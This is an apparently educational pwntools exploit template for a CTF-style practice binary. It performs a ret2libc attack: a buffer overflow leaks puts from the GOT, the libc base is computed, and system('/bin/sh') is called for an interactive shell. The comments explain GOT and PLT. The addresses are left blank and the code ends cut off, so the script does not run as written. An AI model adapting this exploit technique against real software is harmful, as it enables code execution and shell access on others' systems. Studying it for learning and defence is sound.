from pwn import *

r = process('./vuln') #the binary is run

#https://ctf101.org/binary-exploitation/what-is-the-got/
#GOT == Global Offset Table which is the section inside of programs that holds address of functions that are dynamically linked. The GOT contains pointers to libraries twhich move around due to ASLR
#PLT == Before a functions address has been resolved, the GOT points to an entry in the Procedure Linkage Table (PLT). This is a small "stub" function which is responsible for calling the dynamic linker with (effectively) the name of the function that should be resolved.

puts_plt = #puts address in PLT - first call from main()
puts_got = #puts address in GOT - it points to the libc address
main = #address of main from PLT

payload = b""
payload += b"A"*140 #junk buffer
payload += p32(puts_plt) #EIP overwrite
payload += p32(main) #return address
payload += p32(puts_got) #argument to puts()

r.recvuntil('> ') #receive program output until >
r.sendline(payload) #send the exploit buffer, puts will run here
r.recvline() #receive the line of output program sends back
leak = u32(r.recvline()[:4]) #after the first line, the leak is present in the first bytes of the remaining output.
#We want four characters from the beinning ([:4])
#Then, as they are in in-memory order, we unpack it with u32()

log.info('puts@libc is at: {}'.format(hex(leak))) # The leaked value is printed.

#find the address of libc with vmmap libc
#figure the offsets of each by using `p puts`  `p system`  `p exit` and `find /bin`
#take those addresses and subtract the start of the libc address from them to get your offsets to use here
libc_base = leak - #offset from puts to start of libc (i.e. `puts - start_libc`)
system = libc_base + #offset from system to start of libc
exit = libc_base + #offet of exit froms tart of libc
binsh = libc_base + #offset of '/bin/sh' in libc from start of libc

log.info('system@libc is at: {}'.format(hex(system)))
log.info('exit@libc is at: {}'.format(hex(exit)))
log.info('binsh@libc is at: {}'.format(hex(binsh)))

payload = ""
payload = "A"*132 #notice that the payload is different, may not always be the case but sometimes re-calling main changes offset
payload += p32(system)
payload += p32(exit)
payload += p32(binsh)

log.info('Re-exploiting the main().')
r.recvuntil('desert: ')
r.sendline(payload)
r.interactive(
